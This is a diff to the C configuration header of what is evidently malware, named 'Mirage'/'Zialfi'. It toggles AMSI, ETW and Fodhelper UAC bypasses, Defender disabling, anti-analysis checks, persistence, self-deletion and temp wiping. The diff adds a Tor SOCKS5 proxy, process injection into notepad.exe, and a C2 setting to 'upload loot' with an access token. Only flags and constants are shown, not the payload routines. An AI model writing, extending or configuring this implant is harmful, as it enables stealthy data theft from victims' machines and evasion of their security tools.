@@ -11,7 +11,7 @@
 /* ═══════ Crypto Constants ═══════════════════════════════════════ */
 
 #define MIRAGE_SEED            0x61472f96
-#define MIRAGE_SSN_XOR_KEY     0x5a
+#define MIRAGE_SSN_XOR_KEY     0xA3B5C7D9
 
 static const unsigned char MIRAGE_STRING_KEY_ENC[16] = {
     0x4f, 0x6d, 0x65, 0x67, 0x61, 0x20, 0x53, 0x74,  /* "Omega St" */
@@ -118,7 +118,7 @@ static const unsigned char MIRAGE_STRING_KEY_ENC[16] = {
 #define ENABLE_AMSI_BYPASS          /* Patch amsi.dll */
 #define ENABLE_ETW_BYPASS           /* Patch ntdll!EtwEventWrite */
 #define ENABLE_UAC_BYPASS           /* Fodhelper auto-elevation */
-#define ENABLE_PEB_HIDE             /* Unlink from InLoadOrderModuleList */
+#define ENABLE_PEB_HIDE             /* Corrupt DOS header to hide from scanners */
 #define ENABLE_DEFENDER_DISABLE     /* Registry-based disable */
 #define ENABLE_ANTI_ANALYSIS        /* 15 weighted checks */
 #define ENABLE_DETECTION            /* VM/debugger/process detection */
@@ -129,5 +129,33 @@ static const unsigned char MIRAGE_STRING_KEY_ENC[16] = {
 #define ENABLE_PERSISTENCE          /* Registry/Task Scheduler/Startup/WMI */
 #define ENABLE_SELF_DELETE          /* 3-level deletion */
 #define ENABLE_TEMP_WIPE            /* Очистка TMP/TEMP */
+
+/* ═══════ SOCKS5 Proxy ════════════════════════════════════════ */
+#define ENABLE_SOCKS5
+#define SOCKS5_HOST     "127.0.0.1"
+#define SOCKS5_PORT     9050
+
+/* ═══════ Process Injection ════════════════════════════════════ */
+
+#define ENABLE_PROCESS_INJECTION
+#define INJECT_TARGET    "notepad.exe"
+
+/* ═══════ C2 Configuration ═══════════════════════════════════════ */
+
+#define ENABLE_C2_EXFIL             /* Upload loot to C2 panel */
+#define C2_HOST                "127.0.0.1"
+#define C2_PORT                9999
+#define C2_TOKEN               "changeme"
+
+/* #define ZIALFI_DEBUG */  /* Uncomment to enable debug output */
+
+#ifdef ZIALFI_DEBUG
+    #define dbg_printf(...) printf(__VA_ARGS__)
+#else
+    #define dbg_printf(...) ((void)0)
+#endif
+
+/* ═══════ Test Mode — skip blocking checks for smoke testing ═══ */
+/* #define ZIALFI_TEST_MODE */
 
 #endif /* CONFIG_H */
